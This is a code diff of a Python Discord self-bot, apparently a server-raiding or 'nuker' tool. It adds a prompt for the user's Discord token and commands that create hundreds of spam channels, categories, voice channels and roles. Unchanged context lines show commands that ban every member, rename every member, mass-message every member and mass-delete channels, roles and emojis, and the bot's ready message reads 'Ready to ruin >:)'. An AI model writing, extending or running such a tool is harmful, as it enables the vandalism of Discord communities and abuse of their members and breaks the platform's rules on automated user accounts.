@@ -1,25 +1,25 @@
 # CONFIG
 # ---------
-
-prefix = "~" # This will be used at the start of commands.
+token = input("Your Discord Token:") 
+prefix = "~" # 
 # ----------
 
 import discord
 import discord.client
+import time
 from discord.ext import commands
-# Imports the needed libs.
+
 
 print ("Loading..")
 
 bot = commands.Bot(command_prefix=prefix, self_bot=True)
 bot.remove_command("help")
 
-# Declares the bot, passes it a prefix and lets it know to (hopefully) only listen to itself.
 
 @bot.event
 async def on_ready():
-    print ("Ready to be innocent.")
-# Prints when the bot is ready to be used.
+    print ("Ready to ruin >:)")
+
 
 try:
     async def self_check(ctx):
@@ -27,35 +27,45 @@ try:
             return True
         else:
             return False
-    # A secondary check to ensure nobody but the owner can run these commands.
 
-
+    @commands.check(self_check)
     @bot.command(pass_context=True)
-    async def cchannel(ctx):
+    async def cchannels(ctx, string):
         guild = ctx.message.guild
-        for x in "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa":
-           await guild.create_text_channel(':nauseated_face:')
+        await ctx.message.delete()
+        for i in range(0, 499):
+            print ("The channel " + string + " has been created in " + ctx.guild.name)
+            await guild.create_text_channel(string)
+  
 
+    @commands.check(self_check)
     @bot.command(pass_context=True)
-    async def croles(ctx):
+    async def croles(ctx, string):
         guild = ctx.guild
-        colour=discord.Colour(0xFF0000)
-        for x in "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa":           
-           await guild.create_role(name="@ｓｗａｎｇ#4423", colour=discord.Colour(0xFF0000))
+        colour = discord.Colour(0xFF0000)
+        await ctx.message.delete()
+        print ("The role " + string + " has been created in " + ctx.guild.name)
+        for x in range(0, 250):
+           await guild.create_role(name=string, colour=discord.Colour(0xFF0000))
+
+    @commands.check(self_check)
+    @bot.command(pass_context=True)
+    async def ccategories(ctx, string):
+        guild = ctx.message.guild
+        print ("The category " + string + " has been created in " + ctx.guild.name)
+        await ctx.message.delete()
+        for x in range(0, 499):
+          await guild.create_category(string)
 
     @bot.command(pass_context=True)
-    async def ccategory(ctx):
+    async def cvoices(ctx, string):
         guild = ctx.message.guild
-        for x in "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa":
-           await guild.create_category('general')
+        print ("The voice channel " + string + " has been created in " + ctx.guild.name)
+        await ctx.message.delete()
+        for x in range(0, 499): 
+          await guild.create_voice_channel(string)
 
-    @bot.command(pass_context=True)
-    async def cvoice(ctx):
-        guild = ctx.message.guild
-        for x in "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa":
-           await guild.create_voice_channel('fredy-gang')
-
-
+    @commands.check(self_check)
     @bot.command(pass_context=True)
     async def kall(ctx):
         await ctx.message.delete()
@@ -79,7 +89,6 @@ try:
             except:
                 print (f"{user.name} has FAILED to be banned from {ctx.guild.name}")
         print ("Action Completed: ball")  
-    # Bans every member in a server.
 
     @commands.check(self_check)
     @bot.command(pass_context=True)
@@ -92,7 +101,6 @@ try:
             except:
                 print (f"{user.name} has NOT been renamed to {rename_to} in {ctx.guild.name}")
         print ("Action Completed: rall")
-    # Renames every member in a server.
 
     @commands.check(self_check)
     @bot.command(pass_context=True)
@@ -105,7 +113,6 @@ try:
             except:
                 print(f"{user.name} has NOT recieved the message.")
         print("Action Completed: mall")
-    # Messages every member in a server.
 
     @commands.check(self_check)
     @bot.command(pass_context=True)
@@ -154,7 +161,6 @@ try:
                 except:
                     print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
             print ("Action Completed: dall all")
-    # Can perform multiple actions that envolve mass deleting.
 
     @commands.check(self_check)
     @bot.command(pass_context=True)
